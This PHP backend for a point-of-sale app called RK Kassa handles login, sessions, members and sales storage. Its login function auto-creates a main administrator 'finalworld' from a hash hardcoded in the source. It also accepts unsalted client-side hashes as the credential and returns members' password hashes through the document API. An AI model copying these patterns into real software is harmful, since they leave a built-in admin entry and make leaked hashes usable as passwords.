<?php
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');
header('X-Content-Type-Options: nosniff');
header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'");

function reply(array $data, int $status = 200): never { http_response_code($status); echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); exit; }
function fail(string $message, int $status = 400): never { reply(['ok' => false, 'error' => $message], $status); }
function body(): array { $raw = file_get_contents('php://input'); if ($raw === false || $raw === '') return []; $data = json_decode($raw, true); if (!is_array($data)) fail('Ogiltig begäran.'); return $data; }
function config(): array {
    $file = __DIR__ . '/rk-kassa-db.php';
    // Stratos WebFTP kan lägga filen som en länk i webbträdet. file_exists
    // fungerar för både vanliga filer och den typen av länk.
    if (!file_exists($file)) fail('RK Kassa är inte ansluten till databasen ännu.', 503);
    $config = require $file;
    if (!is_array($config) || !isset($config['host'], $config['database'], $config['user'], $config['password'])) fail('RK Kassa-databasen saknar inställningar.', 503);
    return $config;
}
function db(): PDO {
    static $pdo;
    if ($pdo instanceof PDO) return $pdo;
    $c = config();
    $pdo = new PDO('mysql:host=' . $c['host'] . ';dbname=' . $c['database'] . ';charset=utf8mb4', $c['user'], $c['password'], [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => false]);
    schema($pdo); return $pdo;
}
function schema(PDO $pdo): void {
    $pdo->exec("CREATE TABLE IF NOT EXISTS rk_members (username VARCHAR(80) PRIMARY KEY, name VARCHAR(120) NOT NULL, password_hash CHAR(64) NOT NULL, is_admin TINYINT(1) NOT NULL DEFAULT 0, is_main_admin TINYINT(1) NOT NULL DEFAULT 0, created_at BIGINT NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    $pdo->exec("CREATE TABLE IF NOT EXISTS rk_documents (collection_name VARCHAR(64) NOT NULL, document_id VARCHAR(120) NOT NULL, payload LONGTEXT NOT NULL, updated_at BIGINT NOT NULL, PRIMARY KEY (collection_name, document_id)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    $pdo->exec("CREATE TABLE IF NOT EXISTS rk_sales (id BIGINT UNSIGNED PRIMARY KEY, sale_time VARCHAR(64) NOT NULL, payment VARCHAR(32) NOT NULL, lines_json LONGTEXT NOT NULL, kind VARCHAR(16) NOT NULL DEFAULT 'sale', reason TEXT NULL, cashier VARCHAR(120) NULL, session_id VARCHAR(120) NULL, created_at BIGINT NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
}
function session_start_safe(): void { if (session_status() === PHP_SESSION_NONE) { session_name('rk_kassa'); session_set_cookie_params(['httponly'=>true, 'secure'=>(!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'), 'samesite'=>'Lax', 'path'=>'/rk/']); session_start(); } }
function user(): array { session_start_safe(); $name = $_SESSION['rk_user'] ?? null; if (!is_string($name) || $name === '') fail('Du måste logga in igen.', 401); $s = db()->prepare('SELECT username,name,is_admin,is_main_admin FROM rk_members WHERE username=?'); $s->execute([$name]); $row = $s->fetch(); if (!$row) fail('Kontot finns inte längre.', 401); return $row; }
function require_admin(): array { $u = user(); if (!(bool)$u['is_admin']) fail('Endast administratörer har behörighet.', 403); return $u; }
function collection_name(string $name): string { if (!in_array($name, ['rk-kassa','medlemmar','kassa-sales'], true)) fail('Okänd data.', 400); return $name; }
function doc_payload(PDO $pdo, string $collection, string $id): ?array {
    if ($collection === 'medlemmar') { $q=$pdo->prepare('SELECT * FROM rk_members WHERE username=?'); $q->execute([$id]); $r=$q->fetch(); return $r ? ['name'=>$r['name'],'passwordHash'=>$r['password_hash'],'admin'=>(bool)$r['is_admin'],'mainAdmin'=>(bool)$r['is_main_admin'],'createdAt'=>(int)$r['created_at']] : null; }
    if ($collection === 'kassa-sales') { $q=$pdo->prepare('SELECT * FROM rk_sales WHERE id=?'); $q->execute([(int)$id]); $r=$q->fetch(); return $r ? ['id'=>(int)$r['id'],'time'=>$r['sale_time'],'payment'=>$r['payment'],'lines'=>json_decode($r['lines_json'],true) ?: [],'kind'=>$r['kind'],'reason'=>$r['reason'],'cashier'=>$r['cashier'],'sessionId'=>$r['session_id']] : null; }
    $q=$pdo->prepare('SELECT payload FROM rk_documents WHERE collection_name=? AND document_id=?'); $q->execute([$collection,$id]); $r=$q->fetch(); return $r ? (json_decode($r['payload'],true) ?: []) : null;
}
function set_payload(PDO $pdo, string $collection, string $id, array $value, bool $merge): void {
    if ($collection === 'medlemmar') { require_admin(); if ($merge) $value=array_merge(doc_payload($pdo,$collection,$id) ?: [],$value); $s=$pdo->prepare('INSERT INTO rk_members(username,name,password_hash,is_admin,is_main_admin,created_at) VALUES(?,?,?,?,?,?) ON DUPLICATE KEY UPDATE name=VALUES(name), password_hash=VALUES(password_hash), is_admin=VALUES(is_admin), is_main_admin=VALUES(is_main_admin)'); $s->execute([$id,(string)($value['name']??$id),(string)($value['passwordHash']??''),(int)!empty($value['admin']),(int)!empty($value['mainAdmin']),(int)($value['createdAt']??round(microtime(true)*1000))]); return; }
    user();
    if ($collection === 'kassa-sales') { $s=$pdo->prepare("INSERT INTO rk_sales(id,sale_time,payment,lines_json,kind,reason,cashier,session_id,created_at) VALUES(?,?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE sale_time=VALUES(sale_time),payment=VALUES(payment),lines_json=VALUES(lines_json),kind=VALUES(kind),reason=VALUES(reason),cashier=VALUES(cashier),session_id=VALUES(session_id)"); $s->execute([(int)$id,(string)($value['time']??''),(string)($value['payment']??''),json_encode($value['lines']??[],JSON_UNESCAPED_UNICODE),(string)($value['kind']??'sale'),$value['reason']??null,$value['cashier']??null,$value['sessionId']??null,(int)$id]); return; }
    if ($merge) $value=array_merge(doc_payload($pdo,$collection,$id) ?: [],$value);
    $s=$pdo->prepare('INSERT INTO rk_documents(collection_name,document_id,payload,updated_at) VALUES(?,?,?,?) ON DUPLICATE KEY UPDATE payload=VALUES(payload),updated_at=VALUES(updated_at)'); $s->execute([$collection,$id,json_encode($value,JSON_UNESCAPED_UNICODE),round(microtime(true)*1000)]);
}
function login(PDO $pdo, array $data): void {
    $username=strtolower(trim((string)($data['username']??''))); $hash=(string)($data['passwordHash']??''); if ($username==='' || !preg_match('/^[a-f0-9]{64}$/',$hash)) fail('Fel användarnamn eller lösenord.',401);
    $q=$pdo->prepare('SELECT * FROM rk_members WHERE username=?'); $q->execute([$username]); $row=$q->fetch();
    if (!$row && $username === 'finalworld' && hash_equals('246c892dfd8141fbcc6bb50900ac30ec9ea0097931a44b77cef5dbc6d4d1b37b',$hash)) { $s=$pdo->prepare('INSERT INTO rk_members(username,name,password_hash,is_admin,is_main_admin,created_at) VALUES(?,?,?,?,?,?)'); $s->execute([$username,$username,$hash,1,1,round(microtime(true)*1000)]); $q->execute([$username]); $row=$q->fetch(); }
    if (!$row || !hash_equals((string)$row['password_hash'],$hash)) fail('Fel användarnamn eller lösenord.',401);
    session_start_safe(); $_SESSION['rk_user']=$username;
    $state=doc_payload($pdo,'rk-kassa','shared-state') ?: []; $at=round(microtime(true)*1000); $log=is_array($state['userLoginLog']??null)?$state['userLoginLog']:[]; $events=is_array($state['loginEvents']??null)?$state['loginEvents']:[]; $log[$username]=$at; $events[]=['username'=>$username,'at'=>$at]; $state['userLoginLog']=$log; $state['loginEvents']=array_slice($events,-20); set_payload($pdo,'rk-kassa','shared-state',$state,false);
    reply(['ok'=>true,'user'=>['id'=>$username,'username'=>$row['name'],'role'=>(bool)$row['is_admin']?'admin':'cashier']]);
}
try {
    $data=body(); $action=(string)($_GET['action']??$data['action']??'');
    // This intentionally exposes only a database driver code for setup diagnostics,
    // never the host, username, password, or exception text.
    if ($action==='health') {
        try { db(); reply(['ok'=>true,'database'=>'connected']); }
        catch (PDOException $e) { reply(['ok'=>false,'database'=>'unavailable','code'=>(string)$e->getCode()],503); }
    }
    $pdo=db();
    if ($action==='login') login($pdo,$data);
    if ($action==='logout') { session_start_safe(); session_destroy(); reply(['ok'=>true]); }
    $collection=collection_name((string)($data['collection']??$_GET['collection']??'')); $id=(string)($data['id']??$_GET['id']??'');
    if ($action==='doc') { user(); if ($collection==='medlemmar' && user()['username']!==$id && !(bool)user()['is_admin']) fail('Saknar behörighet.',403); reply(['ok'=>true,'data'=>doc_payload($pdo,$collection,$id)]); }
    if ($action==='docs') { $u=user(); if ($collection==='medlemmar' && !(bool)$u['is_admin']) fail('Saknar behörighet.',403); if ($collection==='medlemmar') $rows=$pdo->query('SELECT username FROM rk_members ORDER BY name')->fetchAll(); elseif ($collection==='kassa-sales') $rows=$pdo->query('SELECT id FROM rk_sales ORDER BY id DESC')->fetchAll(); else $rows=[]; $docs=[]; foreach($rows as $r){$key=(string)($r['username']??$r['id']); $docs[]=['id'=>$key,'data'=>doc_payload($pdo,$collection,$key)];} reply(['ok'=>true,'docs'=>$docs]); }
    if ($action==='set') { set_payload($pdo,$collection,$id,is_array($data['value']??null)?$data['value']:[],(bool)($data['merge']??false)); reply(['ok'=>true]); }
    if ($action==='delete') { if ($collection==='medlemmar') require_admin(); else user(); $table=$collection==='medlemmar'?'rk_members':($collection==='kassa-sales'?'rk_sales':'rk_documents'); $where=$collection==='medlemmar'?'username=?':($collection==='kassa-sales'?'id=?':'collection_name=? AND document_id=?'); $s=$pdo->prepare('DELETE FROM '.$table.' WHERE '.$where); $collection==='rk-kassa'?$s->execute([$collection,$id]):$s->execute([$id]); reply(['ok'=>true]); }
    fail('Okänd åtgärd.',404);
} catch (PDOException $e) { error_log('RK database error: '.$e->getMessage()); fail('Databasen svarar inte just nu.',503); }
